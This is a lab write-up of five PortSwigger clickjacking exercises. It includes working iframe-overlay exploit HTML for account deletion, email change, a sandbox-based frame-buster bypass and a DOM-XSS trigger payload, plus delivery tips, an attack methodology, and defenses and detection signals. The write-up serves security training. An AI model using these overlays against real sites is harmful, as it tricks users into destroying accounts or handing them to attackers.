# PortSwigger Clickjacking 1-5 — UI Redressing as a Methodology Track

A consolidated walkthrough of the five PortSwigger Clickjacking labs. The useful lesson is not the individual CSS trick; it is the boundary shift:

**Clickjacking does not forge a request. It forges the user's visual context.** The browser still sends the victim's cookies, and the target page still submits its own CSRF token. What fails is the user's understanding of what their click is doing.

## 1. Overview

| # | Lab | Difficulty | Target action | Framed URL | Core idea |
|---|-----|------------|---------------|------------|-----------|
| 1 | Basic clickjacking with CSRF token protection | Apprentice | delete account | `/my-account` | CSRF tokens do not help when the real page submits the real token |
| 2 | Form input prefilled from URL parameter | Apprentice | change email | `/my-account?email=...` | prefill state via URL, leave only the click to the victim |
| 3 | Frame buster script | Apprentice | change email | sandboxed `/my-account?email=...` | `sandbox="allow-forms"` permits form submission while suppressing the frame-buster script |
| 4 | Trigger DOM-based XSS | Practitioner | call `print()` | `/feedback?...#feedbackResult` | clickjacking is the trigger; the feedback result DOM sink executes the XSS |
| 5 | Multistep clickjacking | Practitioner | delete + confirm | `/my-account` | two decoys: one for Delete, one for Yes |

All five labs solved. The main operational correction was coordinate measurement: **the click target must be aligned against the iframe viewport, not the outer browser viewport.**

## 2. Base pattern

The minimal exploit has three layers:

```html
<style>
iframe {
  position: relative;
  width: 500px;
  height: 700px;
  opacity: 0.0001;
  z-index: 2;
}
.decoy {
  position: absolute;
  top: 498px;
  left: 70px;
  z-index: 1;
}
</style>
<div class="decoy">Click me</div>
<iframe src="https://LAB.web-security-academy.net/my-account?email=attacker@example.net"></iframe>
```

The decoy text is below the iframe. The user sees the decoy text, but the actual click lands in the transparent iframe on the real target button.

For alignment, temporarily set `opacity: 0.1`, inspect the target button, then restore `0.0001` before delivery.

## 3. Lab notes

### Lab 1 — Basic clickjacking with CSRF protection

Target: the `Delete account` button on `/my-account`.

Working alignment for the instance:

```html
<style>
iframe { position:relative; width:500px; height:700px; opacity:0.0001; z-index:2; }
div { position:absolute; top:545px; left:60px; z-index:1; }
</style>
<div>Click me</div>
<iframe src="https://0a8500e0032d34398061533100cc00b0.web-security-academy.net/my-account"></iframe>
```

The CSRF token remains valid because the victim's browser submits the real form from the real page.

### Lab 2 — URL-prefilled email form

The account page accepts `email` as a URL parameter, so the attacker controls the form state and needs only one victim click on `Update email`.

```html
<style>
iframe { position:relative; width:500px; height:700px; opacity:0.0001; z-index:2; }
div { position:absolute; top:498px; left:70px; z-index:1; }
</style>
<div>Click me</div>
<iframe src="https://0ac200e90397f47b829e24b800070030.web-security-academy.net/my-account?email=codex-lab2-iframe@attacker-website.com"></iframe>
```

### Lab 3 — Frame buster script

The page has a JavaScript frame-buster. A sandboxed iframe suppresses scripts while preserving form submission:

```html
<style>
iframe { position:relative; width:500px; height:700px; opacity:0.0001; z-index:2; }
div { position:absolute; top:498px; left:70px; z-index:1; }
</style>
<div>Click me</div>
<iframe sandbox="allow-forms" src="https://0a4e004d03d88b418353f67d004100da.web-security-academy.net/my-account?email=codex-lab3-iframe@attacker-website.com"></iframe>
```

This is the reason script-based frame-busting is not a security boundary. Use `CSP: frame-ancestors` or `X-Frame-Options`, not client-side JavaScript.

### Lab 4 — Clickjacking as a DOM-XSS trigger

The framed page is the feedback form. Query parameters prefill the form, and `#feedbackResult` positions the form/result area. The click submits feedback; the DOM sink then executes the injected name value.

```html
<style>
iframe { position:relative; width:500px; height:700px; opacity:0.0001; z-index:2; }
div { position:absolute; top:610px; left:80px; z-index:1; }
</style>
<div>Click me</div>
<iframe src="https://0a8700b6049d90bb812d25b400b30036.web-security-academy.net/feedback?name=%3Cimg%20src%3D1%20onerror%3Dprint()%3E&email=hacker%40attacker-website.com&subject=test&message=test#feedbackResult"></iframe>
```

Chain:

```text
prefilled URL -> victim clicks Submit feedback -> result renderer writes attacker-controlled name -> print()
```

### Lab 5 — Multistep clickjacking

The delete flow has a confirmation page, so two click targets are required:

```html
<style>
iframe { position:relative; width:500px; height:700px; opacity:0.0001; z-index:2; }
.firstClick, .secondClick { position:absolute; top:497px; left:50px; z-index:1; }
.secondClick { top:296px; left:200px; }
</style>
<div class="firstClick">Click me first</div>
<div class="secondClick">Click me next</div>
<iframe src="https://0a4100450421a23880ad71a000d300fc.web-security-academy.net/my-account"></iframe>
```

Measured target rectangles in the `500x700` iframe:

- `Delete account`: approximately `left=16, top=490, right=162, bottom=522`.
- `Yes`: approximately `left=183, top=288, right=303, bottom=320`.

## 4. Operational gotchas

- **Exploit server delivery:** `POST formAction=DELIVER_TO_VICTIM` returns `302 /deliver-to-victim`. Do not blindly follow it with `curl -L -X POST`, because that replays a POST to `/deliver-to-victim` and yields `400`. Store first, then GET `/deliver-to-victim`.
- **Victim access logs are necessary but insufficient.** Seeing `(Victim) GET /exploit/` proves delivery, not click success. Unsolved labs usually mean coordinate drift.
- **Official coordinates are only a starting point.** The Academy header and viewport width affect button position.
- **Measure in the iframe viewport.** A `500x700` iframe gives different button coordinates than an `800x600` browser tab.
- **Lab 4 solved first because its official `top=610,left=80` happened to match the current iframe layout.**

A reliable alignment probe:

```js
const el = [...document.querySelectorAll("button")]
  .find(b => /Update email|Delete account|Yes|Submit feedback/.test(b.textContent));
el.getBoundingClientRect();
```

Set the browser viewport to the same size as the iframe before using the result.

## 5. Defense and detection

### Controls

- Use response-header framing controls:
  - `Content-Security-Policy: frame-ancestors 'none'` or a strict allowlist.
  - `X-Frame-Options: DENY` / `SAMEORIGIN` for legacy coverage.
- Do not rely on JavaScript frame-busters.
- Sensitive actions should require confirmation that is hard to proxy through a single click: re-authentication, WebAuthn/OTP, or typed confirmation for destructive operations.
- Avoid URL-parameter prefill for sensitive forms, or require visible user confirmation after prefill.
- Treat multi-step confirmations as frameable attack surfaces too; every step needs framing protection.

### Detection signals

- External pages embedding account/settings/feedback endpoints in iframes.
- CSS patterns such as `opacity:0.0001`, absolute-positioned decoys, and high-z-index transparent frames.
- `sandbox="allow-forms"` on an iframe that targets account-management pages.
- Sensitive POSTs (`/my-account/change-email`, `/my-account/delete`, `/feedback/submit`) with unusual `Referer`, `Origin`, `Sec-Fetch-Site`, or missing normal navigation history.
- Short sequences that look like mechanical click flows: account page view followed immediately by destructive POST without normal user dwell time.

## 6. Methodology

For a new clickjacking target:

1. Check whether the page can be framed (`frame-ancestors`, `X-Frame-Options`).
2. Identify the minimal user gesture: one click, two clicks, or click + typed value.
3. Look for prefill surfaces: URL parameters, fragments, saved form state, or DOM routing state.
4. If a frame-buster exists, test whether sandboxing can suppress scripts while preserving forms.
5. Consider combinations with client-side bugs. Lab 4 shows clickjacking as a trigger for DOM XSS.
6. Measure coordinates against the actual iframe viewport before delivery.

CSRF tokens prove that a request came from the target page. They do not prove that the user understood the action they were clicking.
